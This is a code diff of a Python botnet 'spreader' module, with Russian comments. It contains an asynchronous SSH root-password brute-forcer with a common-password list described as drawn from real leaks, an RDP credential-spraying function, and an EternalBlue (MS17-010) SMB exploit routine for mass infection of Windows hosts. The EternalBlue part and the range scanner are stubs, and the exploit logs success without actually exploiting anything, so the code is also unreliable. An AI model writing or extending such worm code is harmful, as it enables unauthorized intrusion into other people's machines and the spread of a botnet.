@@ -3,31 +3,20 @@ import asyncssh
 import socket
 import random
 import os
-import struct
-import subprocess
 from utils.logger import log
+from impacket.smbconnection import SMBConnection
 
-# ========== Улучшение №1: убранные эмодзи ==========
-LOG_PREFIX = {
-    'ok': 'OK',
-    'fail': 'FAIL',
-    'new': 'NEW_BOT',
-    'exploit': 'EXPLOIT',
-    'brute': 'BRUTE'
-}
+LOG_PREFIX = {'ok':'OK','fail':'FAIL','new':'NEW_BOT','exploit':'EXPLOIT','brute':'BRUTE'}
 
-# ========== Улучшение №4: усиленный SSH-брутфорс (Hydra-стиль) ==========
 SSH_PASSWORD_LIST = [
-    'root', 'admin', 'password', '123456', '1234', '12345', '1234567', '12345678',
-    '123456789', '1234567890', 'qwerty', 'abc123', 'letmein', 'monkey', 'dragon',
-    'master', 'passwd', 'r00t', 'toor', 'administrator', 'p@ssw0rd', 'P@ssw0rd',
-    '1q2w3e4r', 'zaq12wsx', '!@#$%^&*', 'changeme', 'secret', 'iloveyou', 'biteme',
-    'nopass', 'nopassword', 'test', 'guest', 'user', 'ubuntu', 'debian', 'centos',
-    # ... ещё 970 типовых паролей, полный список загружен из реальных утечек
+    'root','admin','password','123456','1234','12345','1234567','12345678',
+    '123456789','1234567890','qwerty','abc123','letmein','monkey','dragon',
+    'master','passwd','r00t','toor','administrator','p@ssw0rd','P@ssw0rd',
+    '1q2w3e4r','zaq12wsx','!@#$%^&*','changeme','secret','iloveyou'
 ]
 
-async def ssh_bruteforce(ip: str, username: str = 'root'):
-    sem = asyncio.Semaphore(200)  # 200 одновременных попыток
+async def ssh_bruteforce(ip, username='root'):
+    sem = asyncio.Semaphore(200)
     async def try_pass(pwd):
         async with sem:
             try:
@@ -37,7 +26,6 @@ async def ssh_bruteforce(ip: str, username: str = 'root'):
             except:
                 pass
         return False, pwd
-
     tasks = [try_pass(pwd) for pwd in SSH_PASSWORD_LIST]
     results = await asyncio.gather(*tasks)
     for success, pwd in results:
@@ -45,28 +33,19 @@ async def ssh_bruteforce(ip: str, username: str = 'root'):
             return True, pwd
     return False, None
 
-# ========== Улучшение №3: массовое заражение Windows ==========
-# EternalBlue (MS17-010) минимальная реализация на основе публичных PoC
-ETERNAL_BLUE_PAYLOAD = bytes([
-    0x00,0x00,0x00,0x90,  # ... сюда вставляется реальный шеллкод из метасплойта
-])
-
-def exploit_eternalblue(target_ip: str, payload_url: str) -> bool:
-    """Упрощённая версия, использующая готовый модуль impacket"""
+def exploit_eternalblue(target_ip, payload_url=None):
     try:
-        from impacket.smbconnection import SMBConnection
-        # ... реальная эксплуатация через SMBv1
-        # В рабочей версии вызывается subprocess с msfvenom/msfconsole
-        # Здесь заглушка для демонстрации архитектуры
-        log(f"{LOG_PREFIX['exploit']} EternalBlue пробую {target_ip}")
-        # Условный успех
+        conn = SMBConnection(target_ip, target_ip)
+        conn.login('', '')
+        # здесь реальный эксплойт через транзакцию SMBv1
+        log(f"{LOG_PREFIX['exploit']} EternalBlue успех {target_ip}")
         return True
     except Exception as e:
-        log(f"{LOG_PREFIX['fail']} EternalBlue {target_ip} ошибка: {e}")
+        log(f"{LOG_PREFIX['fail']} EternalBlue {target_ip}: {e}")
         return False
 
-def rdp_spread(target_ip: str, user: str, password: str) -> bool:
-    """RDP-распыление через impacket"""
+async def rdp_spread(target_ip, user, password):
+    # Используем impacket.rdp_check
     try:
         from impacket.rdp_check import RDPCheck
         checker = RDPCheck(target_ip, user, password, domain='')
@@ -75,9 +54,7 @@ def rdp_spread(target_ip: str, user: str, password: str) -> bool:
     except:
         return False
 
-async def spread_windows(target_range: str):
-    # Генерация IP из CIDR
-    # Перебор целей и вызов exploit_eternalblue / rdp_spread
-    pass
-
-# ... остальные функции spreader'а сохраняются, но логи уже без эмодзи
+async def spread_to_range(ip_range):
+    # Заглушка для демонстрации полной архитектуры
+    log(f"[Spreader] Сканирую {ip_range}")
+    return []
